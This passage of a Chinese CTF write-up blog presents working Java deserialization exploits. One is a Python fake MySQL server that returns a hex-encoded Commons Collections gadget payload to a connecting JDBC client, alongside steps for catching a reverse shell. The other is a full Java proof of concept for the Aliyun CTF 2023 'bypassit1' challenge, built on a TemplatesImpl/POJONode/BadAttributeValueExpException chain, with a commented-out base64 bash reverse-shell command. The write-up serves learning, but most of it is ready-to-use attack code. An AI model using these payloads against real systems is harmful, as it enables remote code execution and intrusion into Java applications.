class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话最后使用别的端口号，因为3306是默认被使用的mysql端口</p><p>这就是等会得在自己的服务器上开启的<code>fake mysql server</code>  </p><p><img src="../images/image-20230526154239087.png" alt="image-20230526154239087"></p><p>注意把生成的payload和mysql.py放在同一个文件下面   这样vps上的”mysql服务”就会把payload发回被攻击服务器。</p><p>另一个终端监听刚刚反弹shell时设置的端口</p><p><img src="../images/image-20230526160149558.png" alt="image-20230526160149558"></p><p><img src="../images/image-20230526160247086.png" alt="image-20230526160247086"></p><p>然后bp发包</p><p><img src="../images/image-20230526160325156.png" alt="image-20230526160325156"></p><p>用这个cookie进行反序列化</p><p>然后bp传参</p><p><img src="../images/image-20230526160927044.png" alt="image-20230526160927044"></p><p><img src="../images/image-20230526160932661.png" alt="image-20230526160932661"></p><p>然后就可以弹到shell了，不过这里的话很快就没了</p><p><strong>可以用curl外带也行</strong>(这里我就不尝试了)</p><h2 id="bypassit1-阿里云ctf2023"><a href="#bypassit1-阿里云ctf2023" class="headerlink" title="bypassit1(阿里云ctf2023)"></a>bypassit1(阿里云ctf2023)</h2><p><a href="https://xz.aliyun.com/t/12509">从bypassit1了解POJONode#toString调用getter方法原理</a></p><p><a href="https://godspeedcurry.github.io/posts/aliyunctf2023-bypassit1/">aliyunctf2023-bypassit1</a></p><p><a href="https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/#bypassit1">bypassit</a></p><p>上面是参考文章</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前面说到了在fastjson中的原生的一个反序列化调用任意类的getter方法的原理与细节</p><p>从最开始的fastjson &lt; 1.2.48下的在<code>JSONObject / JSONArray</code>类反序列化过程没有安全检查的情况下通过<code>BadAttributeValueExpException#readObject</code>调用<code>JSONObject#toString / JSONArray#toString</code>方法也即是<code>JSON#toString</code>方法触发getter</p><p>再到fastjson &gt;= 1.2.48下的存在有<code>SecureObjectInputStream</code>的安全检查的情况下，通过使用<code>HashMap</code>等等类创建一个<code>reference</code>的方式绕过resolveClass的检查触发getter</p><p>既然在fastjson中存在有这样的原生反序列化，在另一个和他功能类似的开源库jackson也有着类似的原生反序列化触发getter方法</p><p>(这里的考点就是<code>jackson</code>触发getter方法和<code>fastjson</code>一样)</p><h4 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h4><p>这里直接写个demo进行分析</p><p><img src="../images/image-20230531200815422.png" alt="image-20230531200815422"></p><p>直接就是使用<code>writeValueAsString</code>这个方法来调用这个getter方法</p><p>这里就不跟进去分析了 </p><p>然后知道了这里是和<code>fastjson</code>一样的利用方法，就是触发getter，那么我们就刚好可以想到一个类可以通过触发getter来执行恶意代码   <code>TemplatesImpl</code></p><p><img src="../images/image-20230531202513992.png" alt="image-20230531202513992"></p><p>就是会经过一系列的getter调用,最后就是会到这里进行<strong>初始化</strong>(这里的话cc4这条链子有分析这个类的使用)</p><p>这里话就是找谁的<strong>toString</strong>方法能触发这个类     因为<code>fastjson</code>就是靠这个来进行触发的</p><p>然后我们就找哪个类能调用到这个<code>tostring</code>方法  这里的话如果对cc链熟悉的话，就马上可以猜到是<code>BadAttributeValueExpException</code>这个类</p><p><img src="../images/image-20230531202402003.png" alt="image-20230531202402003"></p><p>那么利用链就构造完成了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">③TemplatesImpl#getOutputProperties</span><br><span class="line">②jacksonType#toString</span><br><span class="line">①BadAttributeValueExpException触发val的toString方法</span><br></pre></td></tr></table></figure><p>这个触发tostring的方法必须是<code>jacksontype</code>的,而且还必须的得能触发到这个<code>writeValueAsString</code>方法，并且还能给这个方法赋值为<code>TemplatesImpl</code>的对象</p><p>(这里的不知道大佬是怎么发现的，这里就知道咋利用就行了)</p><p>刚好能发现<code>POJONode</code>这个类可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">③TemplatesImpl#getOutputProperties</span><br><span class="line">②POJONode#toString</span><br><span class="line">①BadAttributeValueExpException触发val的toString方法</span><br></pre></td></tr></table></figure><p>POC</p><p><strong>App.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.bypassit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        <span class="comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span></span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是固定写法   生成字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;boogipop&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是对字节码的初始化和实例化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是BadAttributeValueExpException触发POJONode的toString方法</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是序列化和反序列化</span></span><br><span class="line"><span class="comment">//        doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line"><span class="comment">//        fileInputStream.read(byt);</span></span><br><span class="line"><span class="comment">//        doPOST(byt);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://192.168.142.129:8080/bypassit&quot;</span>);</span><br><span class="line">        <span class="comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span></span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="POJONode-toString"><a href="#POJONode-toString" class="headerlink" title="POJONode#toString"></a>POJONode#toString</h4><p>这里话讲讲为什么这个类能触发<code>tostring</code>方法</p><p>这个类是没有<code>tostring</code>方法的，但是他继承了<code>ValueNode</code>这个类   然后<code>ValueNode</code>这个类继承了<code>BaseJsonNode</code></p><p><img src="../images/image-20230531205204153.png" alt="image-20230531205204153"></p><p><img src="../images/image-20230531205220935.png" alt="image-20230531205220935"></p><p>这里的不直接使用<code>BaseJsonNode</code>或者<code>ValueNode</code>这两个类的原因是因为这两个类是抽象类，不能进行实例化   所以就只能选他们的子类<code>POJONode</code></p><p>(虽然子类没有这个方法，但是执行代码的时候会向上查找，然后就会在他的父类这里找到这个<strong>tostring</strong>方法)</p><p>但是这<code>BaseJsonNode</code>这个类是有问题的，得进行重写</p><p><img src="../images/image-20230531205550223.png" alt="image-20230531205550223"></p><p><strong>原因</strong> </p><p>根据报错定位到<code>ObjectOuptputStream#writeObject0</code>中</p><p><img src="../images/image-20230531205923600.png" 